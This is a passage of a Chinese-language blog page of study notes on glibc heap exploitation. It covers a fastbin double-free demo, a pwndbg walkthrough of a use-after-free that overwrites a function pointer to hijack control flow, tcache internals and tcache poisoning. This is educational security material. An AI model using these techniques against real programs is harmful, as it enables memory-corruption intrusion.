<p>gdb fastbin_dup</p>
<p>运行一下，加载基地址，给main函数下断点运行。</p>
<p>gdb默认aslr关闭，如果想要开启aslr，输入</p>
<p>aslr on  然后重新运行即可</p>
</blockquote>
<h2 id="calloc分配"><a href="#calloc分配" class="headerlink" title="calloc分配"></a>calloc分配</h2><p>继续从top chunk中切割数据，不是从tcachebin中拿取。</p>
<p><img src="https://i.imgur.com/hWAvDVV.png"></p>
<p>可以看到原先的tcache中的chunk没有被分配，反而是从topchunk中拿取chunk。</p>
<p><img src="https://i.imgur.com/cJyHQd2.png"></p>
<p>可以看到确实是从topchunk中切割</p>
<p>free了calloc请求的chunk，再次calloc会将freechunk中的内容返回给我们，并不是之前第一次calloc那次从topchunk中切割</p>
<blockquote>
<p>为什么不是0x20？</p>
<p>因为1是表示前一个chunk正在被使用。0表示前一个是空闲状态。</p>
</blockquote>
<h2 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h2><p>此文件演示了使用fastbins进行的简单的双重释放攻击。</p>
<p>首先填充tcache。 分配3个缓冲区。</p>
<p>第一个calloc（1，8）：0x55c0dafd5360</p>
<p>第2个calloc（1，8）：0x55c0dafd5380 </p>
<p>第3个calloc（1，8）：0x55c0dafd53a0</p>
<p> 释放第一个… 如果我们再次释放0x55c0dafd5360，则事情将会崩溃，因为0x55c0dafd5360在释放列表的顶部。</p>
<p> 因此，我们将释放0x55c0dafd5380。【先释放b，再double释放a，可行】</p>
<p> 现在，我们可以再次释放0x55c0dafd5360，因为它不是空闲列表的开头。 现在，空闲列表具有[0x55c0dafd5360、0x55c0dafd5380、0x55c0dafd5360]。 如果我们malloc 3次，我们将两次获得0x55c0dafd5360！</p>
<p>第一个calloc（1，8）：0x55c0dafd5360 </p>
<p>第2个calloc（1，8）：0x55c0dafd5380 </p>
<p>第3个calloc（1，8）：0x55c0dafd5360 </p>
<blockquote>
<p>tcache已经满了，进入到fastbin中，因为大小是0x21</p>
</blockquote>
<h1 id="–fastbin-reverse-into-tcache"><a href="#–fastbin-reverse-into-tcache" class="headerlink" title="–fastbin_reverse_into_tcache"></a><strong>–fastbin_reverse_into_tcache</strong></h1><h1 id="ufa"><a href="#ufa" class="headerlink" title="ufa"></a>ufa</h1><blockquote>
<p>原来的p指针指向一个结构体，当结构体没释放之后没有将p置为null，如果我们重新分配原结构体大小的空间，则指针p可以继续使用。但是再次使用时，因为p指针指向的内存包含的数据不是原来的数据了，此时的引用对于正常程序来说是有风险的。</p>
</blockquote>
<p>可以进行这些攻击：</p>
<p>任意地址读：puts(p-&gt;name)—————&gt;puts(char*(addr2))</p>
<p>任意地址写：strcpy(p-&gt;name,data);——&gt;strcpy((char *)(addr2),data)</p>
<p>控制流劫持：p-&gt;func()———————&gt;call addr3</p>
<p>pwndbg&gt; heap<br>Allocated chunk | PREV_INUSE<br>Addr: 0x94ac008<br>Size: 0x151</p>
<p>Allocated chunk | PREV_INUSE<br>Addr: 0x94ac158<br>Size: 0x11</p>
<p>Allocated chunk | PREV_INUSE<br>Addr: 0x94ac168<br>Size: 0x31</p>
<p>Allocated chunk | PREV_INUSE<br>Addr: 0x94ac198<br>Size: 0x11</p>
<p>Allocated chunk | PREV_INUSE<br>Addr: 0x94ac1a8<br>Size: 0x31</p>
<p>Top chunk | PREV_INUSE<br>Addr: 0x94ac1d8<br>Size: 0x21e29</p>
<p>pwndbg&gt; x/10gx 0x94ac1a8<br>0x94ac1a8:    0x0000003100000000    0x0000000a61616464<br>0x94ac1b8:    0x0000000000000000    0x0000000000000000<br>0x94ac1c8:    0x0000000000000000    0x0000000000000000<br>0x94ac1d8:    0x00021e2900000000    0x0000000000000000<br>0x94ac1e8:    0x0000000000000000    0x0000000000000000<br>pwndbg&gt; x/10gx 0x94ac1a8-0x10<br>0x94ac198:    0x0000001100000000    0x094ac1b00804865b<br>0x94ac1a8:    0x0000003100000000    0x0000000a61616464<br>0x94ac1b8:    0x0000000000000000    0x0000000000000000<br>0x94ac1c8:    0x0000000000000000    0x0000000000000000<br>0x94ac1d8:    0x00021e2900000000    0x0000000000000000<br>pwndbg&gt; x/10gx 0x94ac158<br>0x94ac158:    0x0000001100000000    0x094ac1700804865b<br>0x94ac168:    0x0000003100000000    0x0000000a61616161<br>0x94ac178:    0x0000000000000000    0x0000000000000000<br>0x94ac188:    0x0000000000000000    0x0000000000000000<br>0x94ac198:    0x0000001100000000    0x094ac1b00804865b</p>
<p><img src="https://i.imgur.com/W5LM66K.png"></p>
<p>这样是一个结构体，前面是put字段，后面是content字段</p>
<p>pwndbg&gt; heap<br>Allocated chunk | PREV_INUSE<br>Addr: 0x9433008<br>Size: 0x151</p>
<p>Free chunk (tcache) | PREV_INUSE<br>Addr: 0x9433158<br>Size: 0x11<br>fd: 0x00</p>
<p>Allocated chunk | PREV_INUSE<br>Addr: 0x9433168<br>Size: 0x31</p>
<p>Free chunk (tcache) | PREV_INUSE<br>Addr: 0x9433198<br>Size: 0x11<br>fd: 0x9433160</p>
<p>Allocated chunk | PREV_INUSE<br>Addr: 0x94331a8<br>Size: 0x31</p>
<p>Top chunk | PREV_INUSE<br>Addr: 0x94331d8<br>Size: 0x21e29</p>
<p>pwndbg&gt; bins<br>tcachebins<br>0x10 [  2]: 0x94331a0 —▸ 0x9433160 ◂— 0x0<br>0x20 [  2]: 0x94331b0 —▸ 0x9433170 ◂— 0x0<br>fastbins<br>0x10: 0x0<br>0x18: 0x0<br>0x20: 0x0<br>0x28: 0x0<br>0x30: 0x0<br>0x38: 0x0<br>0x40: 0x0<br>unsortedbin<br>all: 0x0<br>smallbins<br>empty<br>largebins<br>empty</p>
<p>put字段0x10大小   freeput和content字段，所以tcache中才有俩 0x10和0x20</p>
<p>再次分配时，8大小直接分配了0x11，所以后面直接写magic地址就行。注意这里再次分配取了0x9433160，取尾部。</p>
<p><img src="https://i.imgur.com/vhngrYN.png"></p>
<p>put原本是一个函数的地址，现在被填为magic地址，后面调用put，也就是在print函数那里，就会调用magic函数。</p>
<h2 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><p>用来管理tcache链表：<br> 这个结构体位于heap段的起始位置，且有size：0x251</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> counts[TCACHE_MAX_BINS];<span class="comment">//数组长度64，每个元素最大为0x7，仅占用一个字节（对应64个tcache链表）</span></span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];<span class="comment">//entries指针数组（对应64个tcache链表，cache bin中最大为0x400字节</span></span><br><span class="line">  <span class="comment">//每一个指针指向的是对应tcache_entry结构体的地址。</span></span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>一个tcache链表的结构，单个tcache bins默认最多包含7个块。</p>
<p><strong>tcache_entry：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//2.26</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span><span class="comment">//指向的下一个chunk的fd字段</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure>


<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//2.28存在bk字段所有的bk都指向tcache_perthread_struct的fd</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"> <span class="comment">//指向tcache的下一个chunk，</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* 这个字段是用来检测双重free释放的  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>chunk的大小范围:</p>
<blockquote>
<p>在32bit上是12到512（8byte递增）</p>
<p>在64bit上是24到1024（16bytes递增）</p>
</blockquote>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>tcache_poisoning</p>
<blockquote>
<p>tcache poisoning主要的利用手段是覆盖tcache中的next成员变量，由于tcache_get()函数没有对next进行检查，所以理论上来讲如果我们将next中的地址进行替换，不需要伪造任何chunk结构即可实现malloc到任何地址.</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/198173">https://www.anquanke.com/post/id/198173</a></p>
<p>分配和回收有小总结。</p>
<p>glibc2.23-glibc2.29的malloc.c的变化：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40890756/article/details/102546150">https://blog.csdn.net/qq_40890756/article/details/102546150</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>


<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      const commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>
</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">eetan</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

    </div>
  </footer>

  
  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js"></script>
<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>

  






  





</body>
</html>
